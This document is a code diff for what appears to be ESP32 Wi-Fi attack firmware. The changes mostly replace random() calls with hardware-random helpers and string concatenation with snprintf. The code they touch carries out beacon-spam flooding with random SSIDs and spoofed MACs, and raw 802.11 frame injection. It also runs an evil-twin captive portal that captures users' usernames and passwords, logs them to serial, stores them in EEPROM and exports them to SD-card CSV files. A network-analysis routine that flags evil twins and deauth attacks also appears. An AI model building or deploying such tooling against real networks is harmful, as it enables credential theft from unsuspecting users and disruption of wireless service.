@@ -27,6 +27,21 @@ static inline uint32_t wifiStaScanMsPerChannel() {
   return (uint32_t)constrain((long)WIFI_SCAN_ACTIVE_MS, 120L, 1500L);
 }
 
+static inline uint32_t wifiRandU32(uint32_t maxExclusive) {
+  return maxExclusive ? (uint32_t)(esp_random() % maxExclusive) : 0U;
+}
+
+static inline int wifiRandInt(int maxExclusive) {
+  return maxExclusive > 0 ? (int)wifiRandU32((uint32_t)maxExclusive) : 0;
+}
+
+static inline int wifiRandInt(int minInclusive, int maxExclusive) {
+  if (maxExclusive <= minInclusive) {
+    return minInclusive;
+  }
+  return minInclusive + wifiRandInt(maxExclusive - minInclusive);
+}
+
 namespace Deauther {
   extern void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size);
 }
@@ -1033,7 +1048,7 @@ void output() {
     if (spamYFits(30 + y_offset, 10)) {
       tft.print(".");
     }
-    delay(random(1000));
+    delay(wifiRandInt(1000));
   }
 
   {
@@ -1048,16 +1063,16 @@ void output() {
       tft.print(")");
     }
   }
-  delay(random(500));
+  delay(wifiRandInt(500));
 
   printLine(70 + y_offset, UI_WARN, "[!] SSID generated successfully");
-  delay(random(500));
+  delay(wifiRandInt(500));
 
   printLine(80 + y_offset, UI_WARN, "[!] Setting random SRC MAC");
-  delay(random(500));
+  delay(wifiRandInt(500));
 
   printLine(110 + y_offset, UI_TEXT, "[*] Starting broadcast");
-  delay(random(500));
+  delay(wifiRandInt(500));
 
   const int maxLines = min(18, spamMaxListLines());
   for (int i = 0; i < maxLines; i++) {
@@ -1065,12 +1080,12 @@ void output() {
     if (!spamYFits(y, 10)) {
       break;
     }
-    String randomSSID = ssidList[random(ssidCount)];
+    String randomSSID = ssidList[wifiRandInt(ssidCount)];
     tft.setTextColor(WHITE, TFT_BLACK);
     tft.setCursor(2, y);
     tft.print("[+] ");
     tft.print(randomSSID);
-    delay(random(500));
+    delay(wifiRandInt(500));
   }
 
   maintainTouchNavBar();
@@ -1080,10 +1095,10 @@ void spammer() {
   esp_wifi_set_channel(spamchannel, WIFI_SECOND_CHAN_NONE);
 
   for (int i = 10; i <= 21; i++) {
-    packet[i] = random(256);
+    packet[i] = (uint8_t)wifiRandU32(256);
   }
 
-  String randomSSID = ssidList[random(ssidCount)];
+  String randomSSID = ssidList[wifiRandInt(ssidCount)];
   int ssidLength = randomSSID.length();
   packet[37] = ssidLength;
 
@@ -1099,7 +1114,7 @@ void spammer() {
 
   esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
 
-  delay(1);
+  taskYIELD();
 }
 
 void beaconSpam() {
@@ -1168,22 +1183,22 @@ void beaconSpam() {
     }
 
     while (true) {
-        channel = random(1, 13);
+        channel = (byte)wifiRandInt(1, 13);
         esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
         for (int i = 10; i <= 15; i++) {
-            packet[i] = random(256);
+            packet[i] = (uint8_t)wifiRandU32(256);
         }
         for (int i = 16; i <= 21; i++) {
-            packet[i] = random(256);
+            packet[i] = (uint8_t)wifiRandU32(256);
         }
 
-        packet[38] = ssid[random(65)];
-        packet[39] = ssid[random(65)];
-        packet[40] = ssid[random(65)];
-        packet[41] = ssid[random(65)];
-        packet[42] = ssid[random(65)];
-        packet[43] = ssid[random(65)];
+        packet[38] = ssid[wifiRandInt(65)];
+        packet[39] = ssid[wifiRandInt(65)];
+        packet[40] = ssid[wifiRandInt(65)];
+        packet[41] = ssid[wifiRandInt(65)];
+        packet[42] = ssid[wifiRandInt(65)];
+        packet[43] = ssid[wifiRandInt(65)];
 
         packet[56] = channel;
 
@@ -1607,9 +1622,13 @@ static void deauthPopulateScanResults(int n) {
       memset(macList[i], 0, 6);
     }
 
-    displayPrint("[+] " + ssidLists[i] + (fullSSID.length() > MAX_SSID_LENGTH ? "..." : "") +
-                 " | CH: " + String(WiFi.channel(i)) +
-                 " | RSSI: " + String(WiFi.RSSI(i)), FEATURE_TEXT);
+    char line[180];
+    snprintf(line, sizeof(line), "[+] %s%s | CH: %u | RSSI: %d",
+             ssidLists[i].c_str(),
+             fullSSID.length() > MAX_SSID_LENGTH ? "..." : "",
+             (unsigned)WiFi.channel(i),
+             (int)WiFi.RSSI(i));
+    displayPrint(line, FEATURE_TEXT);
     if (exitMode || stopScan) {
       break;
     }
@@ -1642,11 +1661,16 @@ void analyzeNetworks(int n) {
       displayPrint("[!] Evil Twin: " + ssidLists[i], UI_WARN, true);
     }
     if (isWeirdChannel) {
-      displayPrint("[!] Non-Standard Channel: " + String(WiFi.channel(i)), UI_WARN, true);
+      char line[64];
+      snprintf(line, sizeof(line), "[!] Non-Standard Channel: %u", (unsigned)WiFi.channel(i));
+      displayPrint(line, UI_WARN, true);
     }
 
     if (deauth[i] > 5) {
-      displayPrint("[!!!] HIGH DEAUTH ATTACK on " + ssidLists[i] + " (" + String(deauth[i]) + " attacks)", UI_WARN, true);
+      char line[160];
+      snprintf(line, sizeof(line), "[!!!] HIGH DEAUTH ATTACK on %s (%d attacks)",
+               ssidLists[i].c_str(), (int)deauth[i]);
+      displayPrint(line, UI_WARN, true);
     }
   }
 }
@@ -2854,10 +2878,10 @@ void saveCredential(String username, String password, String ssid) {
     count++;
     EEPROM.write(COUNT_ADDR, count);
     EEPROM.commit();
-    Serial.println("Credential saved at address " + String(addr));
-    Serial.println("Username: " + String(cred.username));
-    Serial.println("Password: " + String(cred.password));
-    Serial.println("SSID: " + String(cred.ssid));
+    Serial.printf("Credential saved at address %d\n", addr);
+    Serial.printf("Username: %s\n", cred.username);
+    Serial.printf("Password: %s\n", cred.password);
+    Serial.printf("SSID: %s\n", cred.ssid);
     Serial.printf("After saving, credential count: %d\n", count);
   } else {
     Serial.println("Credential storage full");
@@ -3173,9 +3197,9 @@ static esp_err_t cpHandleLoginPost(httpd_req_t* req) {
     remoteIp = "0.0.0.0";
   }
   Serial.println("Captured Credentials:");
-  Serial.println("Username: " + username);
-  Serial.println("Password: " + password);
-  Serial.println("SSID: " + String(custom_ssid));
+  Serial.printf("Username: %s\n", username.c_str());
+  Serial.printf("Password: %s\n", password.c_str());
+  Serial.printf("SSID: %s\n", custom_ssid);
   saveCredential(username, password, custom_ssid);
   if (cpAppendCaptureToSD(remoteIp, username, password, String(custom_ssid))) {
     Serial.println("[SD] Captive capture appended to /captive_portal/captured.csv");
@@ -3187,7 +3211,7 @@ static esp_err_t cpHandleLoginPost(httpd_req_t* req) {
 }
 
 static esp_err_t cpHandleNotFound(httpd_req_t* req) {
-  Serial.println("Not found: " + String(req->uri));
+  Serial.printf("Not found: %s\n", req->uri);
   cpHttpSend(req, 302, "text/plain", "");
   return ESP_OK;
 }
@@ -3258,14 +3282,14 @@ void saveSSID(String ssid) {
   if (attackActive) {
     WiFi.softAPdisconnect(true);
     WiFi.softAP(custom_ssid, password, ap_channel);
-    Serial.println("New SSID set: " + String(custom_ssid));
+    Serial.printf("New SSID set: %s\n", custom_ssid);
   }
 }
 
 void deleteCredential(int index) {
   int count = EEPROM.read(COUNT_ADDR);
   if (index < 0 || index >= count) {
-    Serial.println("Invalid credential index: " + String(index));
+    Serial.printf("Invalid credential index: %d\n", index);
     return;
   }
 
@@ -3278,7 +3302,7 @@ void deleteCredential(int index) {
   count--;
   EEPROM.write(COUNT_ADDR, count);
   EEPROM.commit();
-  Serial.println("Credential deleted at index " + String(index));
+  Serial.printf("Credential deleted at index %d\n", index);
   Serial.printf("New credential count: %d\n", count);
 }
 
@@ -3294,7 +3318,7 @@ void clearAllCredentials() {
     EEPROM.write(i, 0);
   }
   EEPROM.commit();
-  Serial.println("All credentials cleared from " + String(CRED_ADDR) + " to " + String(endAddr - 1));
+  Serial.printf("All credentials cleared from %d to %d\n", CRED_ADDR, endAddr - 1);
 }
 
 static void cpDrawCloneFrame(const char* title, const char* subtitle = nullptr) {
@@ -3736,7 +3760,9 @@ void drawMainMenu() {
   displayPrint(custom_ssid, WHITE, false);
   displayPrint("...", UI_TEXT, false);
 
-  displayPrint("Channel: " + String(ap_channel), UI_TEXT, false);
+  char channelLine[32];
+  snprintf(channelLine, sizeof(channelLine), "Channel: %u", (unsigned)ap_channel);
+  displayPrint(channelLine, UI_TEXT, false);
   displayPrint(attackActive ? "Status: Active" : "Status: Inactive", UI_TEXT, false);
   if (cp_deauth_active) {
     char buf[32];
@@ -3881,7 +3907,7 @@ void handleCredList(int x, int y) {
 
   for (int i = startIdx; i < min(count, startIdx + kCredRowsPerPage); i++) {
     if (x >= 220 && x <= 230 && y >= yOffset - 3 && y <= yOffset + 7) {
-      Serial.println("Delete button pressed for credential " + String(i));
+      Serial.printf("Delete button pressed for credential %d\n", i);
       deleteCredential(i);
       drawCredList();
       return;
@@ -3910,7 +3936,9 @@ void handleCredList(int x, int y) {
     Serial.println("Export button pressed");
     int dumped = 0;
     if (cpDumpAllCredentialsToSD(&dumped)) {
-      cpCredListStatus("Exported " + String(dumped) + " -> SD:/captive_portal/eeprom_dump.csv", UI_OK);
+      char status[96];
+      snprintf(status, sizeof(status), "Exported %d -> SD:/captive_portal/eeprom_dump.csv", dumped);
+      cpCredListStatus(status, UI_OK);
     } else {
       cpCredListStatus("Export failed: SD not ready", UI_WARN);
     }
@@ -4161,7 +4189,9 @@ static void cportalHandleCredNavButtons() {
   if (isButtonPressedEdge(BTN_UP)) {
     int dumped = 0;
     if (cpDumpAllCredentialsToSD(&dumped)) {
-      cpCredListStatus("Exported " + String(dumped) + " -> SD:/captive_portal/eeprom_dump.csv", UI_OK);
+      char status[96];
+      snprintf(status, sizeof(status), "Exported %d -> SD:/captive_portal/eeprom_dump.csv", dumped);
+      cpCredListStatus(status, UI_OK);
     } else {
       cpCredListStatus("Export failed: SD not ready", UI_WARN);
     }
@@ -4978,7 +5008,7 @@ static uint8_t ssidLength(const wifi_ap_record_t *ap) {
 
 static void makeRandomMac(uint8_t *mac) {
     for (int i = 0; i < 6; i++) {
-        mac[i] = (uint8_t)random(256);
+        mac[i] = (uint8_t)wifiRandU32(256);
     }
     mac[0] = (mac[0] & 0xFE) | 0x02;
 }
